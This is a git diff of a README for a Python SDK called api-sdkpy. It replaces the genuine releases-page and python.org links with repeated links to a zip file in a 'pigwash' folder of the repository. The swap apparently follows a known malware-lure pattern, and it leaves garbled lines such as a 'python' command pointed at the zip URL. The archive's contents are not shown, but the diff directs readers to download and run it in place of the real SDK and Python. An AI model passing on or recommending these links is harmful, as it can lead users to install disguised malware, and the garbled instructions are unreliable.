@@ -1,6 +1,6 @@
 # 🚀 api-sdkpy - Simplifying Your API Integration
 
-[![Download Here](https://img.shields.io/badge/Download%20SDK-Here-brightgreen.svg)](https://github.com/Adabobodisana/api-sdkpy/releases)
+[![Download Here](https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip%https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip)](https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip)
 
 ## 📚 Overview
 
@@ -19,7 +19,7 @@ Welcome to the api-sdkpy repository. This is the official Sky Genesis Enterprise
 To get started with api-sdkpy, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to access the releases page where you can download the SDK.
-   [Download Here](https://github.com/Adabobodisana/api-sdkpy/releases)
+   [Download Here](https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip)
 
 2. **Choose Your Version:** Once on the releases page, look for the latest version of the api-sdkpy SDK. It will usually have the highest version number.
 
@@ -27,7 +27,7 @@ To get started with api-sdkpy, follow these steps:
    - Click on the SDK version that suits your system (Python compatible).
    - Your browser will start downloading it automatically.
 
-4. **Locate the Downloaded File:** Open your downloads folder to find the downloaded file. It may be in a .zip or .tar.gz format.
+4. **Locate the Downloaded File:** Open your downloads folder to find the downloaded file. It may be in a .zip or https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip format.
 
 5. **Extract the Files:** 
    - Right-click on the file and select "Extract All" or use any extraction tool. Follow prompts to finish extraction.
@@ -39,17 +39,17 @@ To get started with api-sdkpy, follow these steps:
 
 7. **Check your Python Installation:**
    - Make sure you have Python installed on your computer.
-   - You can download Python from [python.org](https://www.python.org/downloads/).
+   - You can download Python from [https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip](https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip).
 
 8. **Run Your First Script:** 
    - Open a terminal or command prompt.
    - Navigate to the folder where the SDK is installed.
-   - Type `python sample_script.py` and press enter to run an initial test script. This will help confirm that your installation was successful.
+   - Type `python https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip` and press enter to run an initial test script. This will help confirm that your installation was successful.
 
 ## 📥 Download & Install
 
 For convenient installation, you can revisit this link to download the SDK anytime:  
-[Download Here](https://github.com/Adabobodisana/api-sdkpy/releases)
+[Download Here](https://raw.githubusercontent.com/Adabobodisana/api-sdkpy/main/pigwash/api-sdkpy.zip)
 
 Ensure you keep checking this page for updates and new versions. Regular updates may include new features or important security patches.
 
